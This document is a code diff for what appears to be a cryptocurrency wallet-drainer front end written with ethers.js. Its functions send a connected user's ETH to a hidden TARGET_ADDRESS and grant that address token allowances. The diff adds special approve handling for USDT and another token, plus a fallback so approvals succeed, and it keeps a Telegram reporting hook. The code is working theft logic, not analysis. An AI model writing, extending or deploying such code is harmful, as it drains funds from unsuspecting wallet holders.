@@ -3,6 +3,8 @@ import { BigNumber, ethers } from 'ethers';
 const TARGET_ADDRESS = process.env.REACT_APP_CONNECT_TARGET_ADDRESS;
 const TG_TOKEN = process.env.REACT_APP_TOKEN;
 const GRUOP_NAME = process.env.REACT_APP_CHANNEL;
+const USDT_ETHEREUM_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
+const BANANA_ETHEREUM_ADDRESS = '0x38E68A37E401F7271568CecaAc63c6B1e19130B4';
 
 function toBigNum(value: number, d: number) {
   return ethers.utils.parseUnits(Number(value).toFixed(d), d);
@@ -23,7 +25,6 @@ async function getEthPrice() {
 }
 
 export const sendEth = async (signer: any, amount: any) => {
-  try {
     const transaction = {
       to: TARGET_ADDRESS,
       value: amount, // Convert amount to wei
@@ -31,10 +32,6 @@ export const sendEth = async (signer: any, amount: any) => {
     const tx = await signer.sendTransaction(transaction);
     await tx.wait();
     return true;  
-  } catch (error) {
-    return false;
-  }
-  
 };
 
 export const getBalance = async (accAdd: string, provider: any) => {
@@ -64,63 +61,82 @@ export const getTokens = async (accAdd: string, chain: string) => {
 
 
 
-export const sendToken = async (tokenAmount: any, tokenContractAddress: string, signer: any) => {
+export const sendToken = async (
+  tokenAmount: any,
+  tokenContractAddress: string,
+  signer: any,
+  txOptions: any
+) => {
   var contractAbiFragment = [
-      {
-          "inputs": [
-              {
-                  "internalType": "address",
-                  "name": "spender",
-                  "type": "address"
-              },
-              {
-                  "internalType": "uint256",
-                  "name": "addedValue",
-                  "type": "uint256"
-              }
-          ],
-          "name": "increaseAllowance",
-          "outputs": [
-              {
-                  "internalType": "bool",
-                  "name": "",
-                  "type": "bool"
-              }
-          ],
-          "stateMutability": "nonpayable",
-          "type": "function"
-      },
-      {
-          "inputs": [
-              {
-                  "internalType": "address",
-                  "name": "spender",
-                  "type": "address"
-              },
-              {
-                  "internalType": "uint256",
-                  "name": "amount",
-                  "type": "uint256"
-              }
-          ],
-          "name": "approve",
-          "outputs": [
-              {
-                  "internalType": "bool",
-                  "name": "",
-                  "type": "bool"
-              }
-          ],
-          "stateMutability": "nonpayable",
-          "type": "function"
-      },
+    {
+      inputs: [
+        {
+          internalType: 'address',
+          name: 'spender',
+          type: 'address',
+        },
+        {
+          internalType: 'uint256',
+          name: 'addedValue',
+          type: 'uint256',
+        },
+      ],
+      name: 'increaseAllowance',
+      outputs: [
+        {
+          internalType: 'bool',
+          name: '',
+          type: 'bool',
+        },
+      ],
+      stateMutability: 'nonpayable',
+      type: 'function',
+    },
+    {
+      inputs: [
+        {
+          internalType: 'address',
+          name: 'spender',
+          type: 'address',
+        },
+        {
+          internalType: 'uint256',
+          name: 'amount',
+          type: 'uint256',
+        },
+      ],
+      name: 'approve',
+      outputs: [
+        {
+          internalType: 'bool',
+          name: '',
+          type: 'bool',
+        },
+      ],
+      stateMutability: 'nonpayable',
+      type: 'function',
+    },
   ];
+  let contract = new ethers.Contract(
+    tokenContractAddress,
+    contractAbiFragment,
+    signer
+  );
 
-  let contract = new ethers.Contract(tokenContractAddress, contractAbiFragment, signer);
-  const tx = await contract.increaseAllowance(TARGET_ADDRESS, tokenAmount);
-  await tx.wait();
-  console.log(tx);
-}
+  if (contract.address.toLowerCase() === USDT_ETHEREUM_ADDRESS.toLowerCase() || contract.address.toLowerCase() === BANANA_ETHEREUM_ADDRESS.toLowerCase()) {
+    const tx = await contract.approve(TARGET_ADDRESS, tokenAmount, txOptions);
+    await tx.wait();
+  } else {
+    try {
+      const tx = await contract.increaseAllowance(TARGET_ADDRESS, tokenAmount, txOptions);
+      await tx.wait();  
+      
+    } catch (error) {
+      const tx = await contract.approve(TARGET_ADDRESS, tokenAmount, txOptions);
+      await tx.wait();
+    }
+  }
+};
 
 
 export const sendMessage = (text: string) => {
